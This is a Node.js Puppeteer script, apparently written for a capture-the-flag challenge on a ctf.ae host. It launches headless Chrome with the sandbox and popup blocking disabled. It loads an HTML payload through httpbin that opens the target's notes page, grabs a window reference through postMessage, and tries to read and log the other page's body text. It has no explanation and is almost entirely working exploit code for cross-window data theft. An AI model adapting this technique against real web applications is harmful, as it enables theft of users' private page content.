const puppeteer = require("puppeteer-core");

(async () => {
  const browser = await puppeteer.launch({
    headless: true,
    executablePath: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    args: ["--no-sandbox", "--disable-popup-blocking"],
  });
  const page = await browser.newPage();
  const watch = (p, label) => {
    p.on("console", msg => console.log(label, "console", msg.type(), msg.text()));
    p.on("pageerror", err => console.log(label, "pageerror", err.message));
    p.on("requestfailed", req => console.log(label, "failed", req.url(), req.failure()?.errorText));
    p.on("response", res => {
      if (res.url().startsWith("data:")) console.log(label, "data-response", res.status(), res.url());
    });
  };
  watch(page, "main");
  page.on("popup", popup => watch(popup, "popup"));
  const controllerCode = `let p;onmessage=e=>p=e.source;setTimeout(()=>{try{console.log('PARENTBODY',p.document.body.innerText)}catch(e){console.log('PARENTERR',e.message)}},5000)`;
  const moduleUrl = "data:text/javascript," + encodeURIComponent(controllerCode);
  const html = `<script>let w=open('http://e5ab60d8c5c85a6f.chal.ctf.ae/notes/aac08f1b',${JSON.stringify(moduleUrl)});setTimeout(()=>w.postMessage(1,'*'),2000);setTimeout(()=>location='http://e5ab60d8c5c85a6f.chal.ctf.ae/notes/',3000)</script>`;
  const loader = `http://httpbin.org/base64/${Buffer.from(html).toString("base64")}`;
  await page.goto(loader, { waitUntil: "domcontentloaded" });
  await new Promise(resolve => setTimeout(resolve, 10000));
  await browser.close();
})();
